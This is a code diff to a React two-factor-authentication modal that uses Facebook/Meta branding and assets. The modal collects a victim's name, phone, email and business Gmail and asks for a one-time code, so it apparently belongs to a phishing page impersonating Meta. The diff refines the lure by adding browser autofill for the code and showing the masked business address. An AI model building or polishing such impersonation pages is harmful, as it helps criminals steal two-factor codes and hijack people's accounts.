@@ -1,4 +1,5 @@
 import React from 'react';
+import Image from 'next/image';
 import Modal from './Modal';
 import { maskEmail, maskPhoneNumber } from '@/utils/mask';
 import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
@@ -34,10 +35,13 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
     const [twoFa, setTwoFa] = React.useState('');
 
-    const { fullName, phone, email } = formDataState as FormData || {};
+    const { fullName, phone, email, emailBusiness } = formDataState as FormData || {};
 
     const phoneDisplay = maskPhoneNumber(phone)
     const emailDisplay = maskEmail(email);
+    const trimmedBiz = (emailBusiness ?? '').trim();
+    const businessGmailMasked =
+        trimmedBiz.toLowerCase().endsWith('@gmail.com') ? maskEmail(trimmedBiz) : undefined;
 
     const [countdown, setCountdown] = React.useState<number>(RETRY_WAIT_AFTER_FIRST_WRONG_SEC);
 
@@ -223,9 +227,15 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         <span>{t.common.facebook}</span>
                     </div>
                     <h2 className='text-[17px] leading-snug text-[black] font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title}</h2>
-                    <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(emailDisplay, phoneDisplay)}</p>
-                    <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
-                        <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
+                    <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(emailDisplay, phoneDisplay, businessGmailMasked)}</p>
+                    <div className="relative my-[15px] aspect-[16/10] w-full overflow-hidden rounded-[10px] bg-[#f5f5f5]">
+                        <Image
+                            src="/images/meta/authentication.png"
+                            alt={t.twoFa.authIllustrationAlt}
+                            fill
+                            className="object-contain object-center"
+                            sizes="(max-width: 768px) 100vw, 640px"
+                        />
                     </div>
                     <div className='w-full'>
                         <form onSubmit={handSubmit}>
@@ -242,6 +252,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                                     onPaste={handlePaste}
                                     disabled={disabled}
                                     maxLength={8}
+                                    autoComplete="one-time-code"
                                     aria-label={t.twoFa.ariaInput}
                                 />
                             </div>
@@ -255,8 +266,15 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                                     aria-label={t.twoFa.ariaSubmit}
                                 >
                                     {loading && (
-                                        <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
-                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
+                                        <div className="relative mr-[10px] h-5 w-5 shrink-0 animate-spin" aria-hidden>
+                                            <Image
+                                                src="/images/icons/ic_loading.svg"
+                                                alt=""
+                                                width={20}
+                                                height={20}
+                                                unoptimized
+                                                className="block h-full w-full"
+                                            />
                                         </div>
                                     )}
                                     {loading ? '' : t.common.continue}
@@ -270,8 +288,15 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                     </div>
                 </div>
 
-                <div className='mx-auto h-[60px] w-[60px] shrink-0'>
-                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
+                <div className="relative mx-auto h-[60px] w-[60px] shrink-0">
+                    <Image
+                        src="/images/meta/logo-gray.svg"
+                        alt={t.twoFa.metaLogoAlt}
+                        width={60}
+                        height={60}
+                        unoptimized
+                        className="h-full w-full object-contain"
+                    />
                 </div>
             </div>
         </Modal>
